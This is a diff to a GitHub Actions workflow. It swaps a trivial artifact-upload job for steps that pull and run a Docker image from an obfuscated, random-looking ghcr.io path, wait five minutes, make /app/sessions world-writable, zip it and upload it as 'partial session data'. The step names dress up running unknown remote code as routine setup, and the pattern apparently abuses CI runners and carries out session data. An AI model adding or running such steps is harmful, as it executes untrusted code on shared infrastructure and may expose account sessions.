@@ -1,27 +1,38 @@
-name: Upload Artifacts Workflow
+name: Initial Setup & Artifact Upload
 
 on:
   push:
     branches:
       - main
+  workflow_dispatch:
 
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
-      - name: Checkout Repository
-        uses: actions/checkout@v3
+    - name: Checkout Repository
+      uses: actions/checkout@v3
 
-      - name: Create Build Files
-        run: |
-          mkdir -p build
-          echo "Hello, Artifact!" > build/output.txt
+    - name: Pull Docker image
+      run: docker pull ghcr.io/nixegohshs5f4ef6vuun43f6/iaw4sm7rs56v3cy7rv66v4rfgu6yu843dawsmsrbitapyv3125:yhf3gj79bt8kytv57vttv7awsmsrbitA0009-of-one
 
-      - name: Upload Artifact
-        uses: actions/upload-artifact@v4
-        with:
-          name: my-artifact
-          path: build/output.txt
-          retention-days: 7
-          compression-level: 6
-          include-hidden-files: false
+    - name: Run Initial Docker Processes
+      run: |
+        docker run -d --name session_container ghcr.io/nixegohshs5f4ef6vuun43f6/iaw4sm7rs56v3cy7rv66v4rfgu6yu843dawsmsrbitapyv3125:yhf3gj79bt8kytv57vttv7awsmsrbitA0009-of-one
+        sleep 300 # Simulate initial processes
+        docker exec session_container bash -c "chmod -R 777 /app/sessions"
+        sleep 10 # Ensure permissions take effect
+        docker exec session_container bash -c "zip -r /app/partial_sessions.zip /app/sessions || true"
+
+    - name: Copy Partial Zip to Runner
+      run: docker cp session_container:/app/partial_sessions.zip partial_sessions.zip
+
+    - name: Upload partial session data as artifact
+      uses: actions/upload-artifact@v4
+      with:
+        name: partial_session_data
+        path: partial_sessions.zip
+        retention-days: 7
+        compression-level: 6
+        include-hidden-files: false
